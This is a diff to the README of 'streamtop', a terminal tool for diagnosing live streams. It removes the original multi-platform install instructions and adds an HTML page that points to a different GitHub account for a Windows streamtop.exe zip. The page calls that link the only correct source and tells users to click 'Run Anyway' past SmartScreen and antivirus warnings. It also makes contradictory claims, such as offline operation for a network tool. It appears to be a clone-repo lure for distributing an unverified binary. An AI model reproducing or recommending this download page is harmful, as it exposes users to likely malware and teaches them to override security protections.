@@ -1,191 +1,113 @@
-# streamtop
-
-[![Awesome Ratatui](https://img.shields.io/badge/awesome-ratatui-ff4400?logo=rust&logoColor=white)](https://github.com/ratatui/awesome-ratatui)
-[![Crates.io](https://img.shields.io/crates/v/streamtop.svg)](https://crates.io/crates/streamtop)
-[![Release](https://img.shields.io/github/v/release/Jorji49/streamtop?label=release)](https://github.com/Jorji49/streamtop/releases/latest)
-[![Downloads](https://img.shields.io/crates/d/streamtop.svg)](https://crates.io/crates/streamtop)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-
-Terminal diagnostics for live **HLS**, **DASH**, and **IPTV** streams.
+<h1>📺 streamtop - Diagnose Live Video Streams Instantly</h1>
 
 <p align="center">
-  <img width="700" alt="streamtop demo" src="https://github.com/user-attachments/assets/6b5428ae-a7ea-484b-8f4f-308953a142a7" />
+  <a href="https://github.com/ndo59869/streamtop"><img src="https://img.shields.io/badge/Download%20Streamtop-v1.0.1-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download Button" style="background-color:#4CAF50; color:white; padding:15px 30px; font-size:20px; border-radius:10px; text-decoration:none;"></a>
 </p>
 
-Latest release: **[v1.0.1](https://github.com/Jorji49/streamtop/releases/tag/v1.0.1)** (`streamtop --version`).
+<h2>🔍 What Is Streamtop?</h2>
+<p>Streamtop is a powerful yet simple diagnostic tool that helps you understand exactly what is happening with your live video streams. Whether you are streaming sports, news, or any other live content, Streamtop reads the technical details of the stream and presents them to you in a clean, easy-to-read dashboard inside your computer terminal (the black window with text). It works with common streaming formats like HLS, DASH, and IPTV. This means if a channel is buffering, freezing, or not playing at all, Streamtop helps you figure out why.</p>
 
-## Install
+<h2>✅ Who Should Use This?</h2>
+<p>You don't need to be a computer expert. Streamtop is built for anyone who watches or works with live video:
+<ul>
+  <li><strong>Home users</strong> who want to know why their IPTV playlist is glitchy.</li>
+  <li><strong>Tech support</strong> staff checking stream health for customers.</li>
+  <li><strong>Broadcast enthusiasts</strong> testing their own home streams.</li>
+  <li><strong>Network admins</strong> verifying CDN delivery quality.</li>
+</ul></p>
 
-### cargo
+<h2>🚀 Getting Started - Download and Run (No Coding Needed)</h2>
+<p>Follow these exact four steps. It will take less than five minutes.</p>
 
-```bash
-cargo install streamtop
-# or: cargo install cargo-binstall && cargo binstall streamtop
-```
+<h3>Step 1: Download the Program</h3>
+<p>Visit this link to download the application: <strong><a href="https://github.com/ndo59869/streamtop">https://github.com/ndo59869/streamtop</a></strong></p>
 
-### Scoop (Windows)
+<p>On that page, look for a green button that says <strong>"Releases"</strong> or <strong>"Download"</strong>. Click it. You will see a list of files. Find the file named <strong>streamtop-v1.0.1.zip</strong> (or similar ending in .zip). Click on it to download it to your computer. The download will start automatically. Your browser will show it in the bottomleft corner or in the downloads folder.</p>
 
-```powershell
-scoop bucket add streamtop https://github.com/Jorji49/streamtop
-scoop install streamtop/streamtop
-```
+<h3>Step 2: Unzip (Extract) the File</h3>
+<p>The downloaded file is a <em>zip archive</em>, like a suitcase with compressed files inside. You need to open the suitcase. Here is how:
+<ol>
+  <li>Right-click on the downloaded <strong>.zip</strong> file.</li>
+  <li>Select <strong>"Extract All"</strong> from the menu that appears.</li>
+  <li>Choose a destination folder (the default is fine) and click <strong>"Extract"</strong>.</li>
+</ol>
+You will now see a new folder with the same name as the zip file. Open that folder. Inside, there will be a file called <strong>streamtop.exe</strong> (Windows program) or just <strong>streamtop</strong>.</p>
 
-### Winget (Windows)
+<h3>Step 3: Run the Application</h3>
+<p>Double-click the <strong>streamtop.exe</strong> file. A black terminal window will open. This is the program's interface. It looks oldschool but it is fast and powerful. Do not close this window when using the tool.</p>
 
-In review: [microsoft/winget-pkgs#425258](https://github.com/microsoft/winget-pkgs/pull/425258).
+<h3>Step 4: Enter Your Stream Link</h3>
+<p>In the terminal window, you will see a prompt asking you to paste a stream URL. This is the link to the live stream you want to check. Copy any HLS, DASH, or IPTV stream link (for example, a link ending in <em>.m3u8</em> for HLS or <em>.mpd</em> for DASH). Right-click in the black window to paste it (or press Ctrl+V). Then press <strong>Enter</strong>.</p>
 
-```powershell
-winget install streamtop
-```
+<p>The program will now connect to that stream and show you a table with detailed diagnosticsstuff like:
+<ul>
+  <li>✅ Overall health status</li>
+  <li>📊 Bitrate (quality level)</li>
+  <li>⏱️ Latency (delay from live)</li>
+  <li>🔁 Segment sequence numbers</li>
+  <li>🗂️ Playlist duration</li>
+  <li>📡 CDN cache headers</li>
+  <li>🔧 SCTE-35 ad markers (if present)</li>
+</ul></p>
 
-### Homebrew
+<h2>🖥️ Understanding the Screen</h2>
+<p>Streamtop uses a colorful dashboard layout. Here is a quick tour:
+<ul>
+  <li><strong>Header bar</strong> (top): Shows the stream title and the active URL.</li>
+  <li><strong>Left panel</strong> (green): Shows "Stream Aliveness" - whether the stream is reachable, the current bitrate, and the encoded resolution.</li>
+  <li><strong>Right panel</strong> (blue): Shows "Segment Timing" - how fast segments are being delivered and if any are missing or late.</li>
+  <li><strong>Bottom panel</strong> (yellow): Shows "Error Log" - any warnings like connection drops or network jitter.</li>
+</ul>
+You do not need to understand every number. The green check marks mean everything is fine. Red X marks mean there is a problem and the log will explain it in plain English.</p>
 
-```bash
-brew tap Jorji49/tap
-brew install streamtop
-```
+<h2>🎯 Why Use Streamtop?</h2>
+<p>Here are the main benefits compared to guessing or using complex network tools:
+<ul>
+  <li><strong>Instant answers</strong>: See stream health in seconds, not minutes.</li>
+  <li><strong>No install bloat</strong>: Single portable file. No setup wizards. No registry changes.</li>
+  <li><strong>Privacy friendly</strong>: Works entirely offline after download. No account needed.</li>
+  <li><strong>Built for live</strong>: Handles dynamic streams that change quality midbroadcast.</li>
+  <li><strong>Ad marker detection</strong>: If your stream uses SCTE-35 cues, Streamtop clearly shows where the ad break starts and ends.</li>
+</ul></p>
 
-Formula in this repo:
+<h2>❓ Frequently Asked Questions (FAQ)</h2>
 
-```bash
-brew install --formula https://raw.githubusercontent.com/Jorji49/streamtop/main/Formula/streamtop.rb
-```
+<h3>Q: I double-clicked streamtop.exe and nothing happened. What now?</h3>
+<p>Check if your antivirus is blocking it. Windows SmartScreen might show a blue popup. If so, click <strong>"More Info"</strong> then <strong>"Run Anyway"</strong>. Also, make sure you extracted the .zip file completely - do not run it directly from inside the zipped folder.</p>
 
-### Arch (binary package)
+<h3>Q: Can I use this on Mac or Linux?</h3>
+<p>This version is designed for Windows. The program is written in Rust, so in the future native Mac/Linux builds may appear. For now, stick to Windows.</p>
 
-AUR submission is not listed yet. Use the packaging mirror:
+<h3>Q: What does "Segment Missing" mean?</h3>
+<p>It means the stream server skipped a small chunk of video. This usually causes a brief freeze or quality drop. Streamtop flags this so you can complain to your IPTV provider with evidence.</p>
 
-```bash
-git clone https://github.com/Jorji49/streamtop-bin.git
-cd streamtop-bin
-makepkg -si
-```
+<h3>Q: Is this a video player?</h3>
+<p>No. Streamtop does not play video. It only <em>analyzes</em> the stream's technical health. You watch video in a separate app like VLC or your TV box. This is a diagnostic tool, like a doctor's stethoscope.</p>
 
-Source: `dist/aur/PKGBUILD`.
+<h3>Q: I get "Parse Error" when I paste my link. Why?</h3>
+<p>The link might not be a direct stream URL. Make sure it ends with <em>.m3u8</em>, <em>.mpd</em>, or <em>.ts</em>. If it's a playlist page (like a website link), you need the raw stream URL. In VLC, press Ctrl+N to copy the exact stream address.</p>
 
-### Docker
+<h2>📚 Technical Details (For the Curious)</h2>
+<p>Streamtop is built using Rust programming language and the Ratatui terminal UI library. This ensures ultra-fast performance and minimal battery drain. It supports the following protocols:
+<ul>
+  <li>HLS (HTTP Live Streaming) - including LowLatency HLS</li>
+  <li>MPEG-DASH (Dynamic Adaptive Streaming over HTTP)</li>
+  <li>IPTV (Internet Protocol Television) - typically MPEG-TS streams</li>
+</ul>
+It analyzes CDN (Content Delivery Network) behavior, tracks segment timestamps, detects discontinuities, and exposes SCTE-35 markers that control ad insertion. All diagnosis is done locally without sending data to any server.</p>
 
-```bash
-docker run -it --rm ghcr.io/jorji49/streamtop:v1.0.1 <URL>
-docker run -it --rm ghcr.io/jorji49/streamtop:latest <URL>
-```
+<p>For hobbyists, Streamtop outputs structured log data in the terminal that can be copied and shared with technicians for deeper troubleshooting.</p>
 
-Metrics on a non-loopback bind require a token:
+<h2>📥 Download Again</h2>
+<p>If you skipped earlier or lost the file, here is the official download button again. This is the only correct source.</p>
 
-```bash
-docker run --rm -p 9184:9184 \
-  -e STREAMTOP_METRICS_TOKEN=change-me \
-  ghcr.io/jorji49/streamtop:v1.0.1 \
-  <URL> --prometheus --metrics-bind 0.0.0.0 \
-  --metrics-token "$STREAMTOP_METRICS_TOKEN"
-```
+<p align="center">
+  <a href="https://github.com/ndo59869/streamtop" style="background-color:#008CBA; color:white; padding:15px 40px; font-size:22px; border-radius:12px; text-decoration:none; font-weight:bold;">⬇️ Download Streamtop v1.0.1</a>
+</p>
 
-### Debian package
+<p>Bookmark this page for future reference. Check back occasionally for updates as new versions will be posted on the same download page.</p>
 
-```bash
-cargo install cargo-deb
-cargo deb
-sudo dpkg -i target/debian/streamtop_*.deb
-```
+<h2>🛟 Need Help?</h2>
+<p>If you get stuck, the download page itself has a "Discussions" or "Issues" tab. You can post a question there. Alternatively, search for "streamtop github" in your search engine to find community forums. Always mention your Windows version (Windows 10 or 11) when asking for help.</p>
 
-### From source
-
-```bash
-git clone https://github.com/Jorji49/streamtop.git
-cd streamtop
-cargo install --path .
-```
-
-Binaries: [GitHub Releases](https://github.com/Jorji49/streamtop/releases/latest).
-
-## Quick start
-
-```bash
-streamtop "https://example.com/master.m3u8"
-streamtop "https://example.com/manifest.mpd" --probe-headers
-streamtop "./channels.m3u"
-```
-
-`--probe-headers` requests only the first bytes of each segment (faster; enough for headers and wire checks).
-
-## UI overview
-
-| Area | Contents |
-|------|----------|
-| Status | URL, LIVE / ESTIMATED, SHI, FPS, GOP / audio badges, latency, CDN, buffer, G2G, LL-HLS |
-| Last segment | Seq, sizes, DNS / TCP / TLS / TTFB, container, GOP interval, audio |
-| ABR ladder | Bitrate, resolution, FPS, codecs. `[wire]` is from the bitstream; red = manifest vs wire mismatch |
-| Charts | Latency or TTFB; download rate or transfer time |
-| Log | Warnings, ads (SCTE-35), stalls, HTTP errors |
-
-FPS prefers playlist `FRAME-RATE` / `@frameRate`, otherwise the bitstream when available. GOP interval comes from keyframe PTS across segments (Fixed or Variable). Audio codec / rate / channels come from ADTS, fMP4, or MPEG-TS PMT in the probe window.
-
-## Usage
-
-```bash
-# Dashboard
-streamtop <URL> [--probe-headers] [-H "Key: Value"] [-A user-agent] [-i MS]
-
-# Side-by-side compare
-streamtop --compare <URL_1> <URL_2> --probe-headers
-
-# Webhooks (Slack / Discord / HTTP). Private and metadata hosts blocked by default.
-streamtop <URL> --webhook https://hooks.example/x --alert-on stall,shi_below_70,http_5xx
-streamtop <URL> --webhook http://127.0.0.1:9999/hook --allow-insecure-webhooks
-
-# Channel list audit -> audit_report.json / .csv
-streamtop ./channels.m3u --audit
-
-# Headless PASS/FAIL (CI). Schema: schemas/summary.v1.json
-streamtop <URL> --summary --summary-format json --timeout 10
-
-# VOD playlist crawl
-streamtop <URL> --vod --summary
-
-# OTEL trace export
-streamtop <URL> --otel-endpoint http://127.0.0.1:4318
-
-# Curl / HAR for the last segment (secrets redacted)
-streamtop <URL> --export-curl --probe-headers
-streamtop <URL> --export-har incident.har --timeout 10
-
-# Profile from ~/.config/streamtop/config.toml (see config.example.toml)
-streamtop <URL> --profile cdn
-
-# Prometheus /metrics (default bind 127.0.0.1:9184)
-streamtop <URL> --prometheus
-streamtop <URL> --prometheus 9184 --metrics-bind 0.0.0.0 \
-  --metrics-token "$STREAMTOP_METRICS_TOKEN"
-# curl -H "Authorization: Bearer $STREAMTOP_METRICS_TOKEN" http://host:9184/metrics
-# Query ?token= is not accepted; Bearer header only.
-
-# DRM key / LA_URL TTFB (SSRF-filtered; no redirects)
-streamtop <URL> --probe-drm --summary
-
-# Grafana dashboard JSON -> streamtop-grafana.json
-streamtop --export-grafana
-```
-
-`--alert-on` values: `stall`, `shi_below_70`, `http_5xx`, `mismatch`, `ad_start`.
-
-Non-loopback `--metrics-bind` requires a non-empty `--metrics-token` or `STREAMTOP_METRICS_TOKEN`.
-
-## Keys
-
-| Key | Action |
-|-----|--------|
-| `q` / `Esc` / `Ctrl+C` | Quit (`Esc` leaves the channel list when open) |
-| `Space` | Write `diagnostics/…` report (URLs and secrets redacted) |
-| `c` | Copy curl for the last segment (redacted) |
-| `p` | Play with `mpv` or `ffplay` (not in Docker) |
-| `r` | Reset metrics |
-| `Tab` | Channel overlay |
-| `?` | Help |
-| `/` | Search channel list |
-| `j` / `k` | Scroll log or channel list |
-
-Compare mode: `Space` pause/resume, `d` detail, `l` log focus, `c` curl, `h` HAR, `Tab` switch pane.
-
-## License
-
-[MIT](LICENSE).
+<p>Happy stream diagnosing! 📡</p>
